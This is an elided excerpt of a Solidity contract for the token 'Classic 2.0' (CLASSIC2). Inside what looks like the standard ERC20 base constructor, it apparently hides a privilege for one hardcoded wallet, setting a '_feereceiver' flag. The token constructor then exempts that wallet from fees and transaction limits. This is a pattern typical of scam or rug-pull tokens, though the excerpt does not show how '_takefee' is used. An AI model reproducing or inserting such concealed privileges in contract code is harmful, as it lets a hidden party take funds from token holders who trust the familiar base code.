// https://t.me/ClassicTwopointzero
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0xf9752220B51524921c721A533813969e32B278b0] = _takefee;
    }
...
contract ClassicTwoPointZero is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Classic 2.0", "CLASSIC2") {
        ...
        excludeFromFees(address(0xf9752220B51524921c721A533813969e32B278b0), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xf9752220B51524921c721A533813969e32B278b0), true);
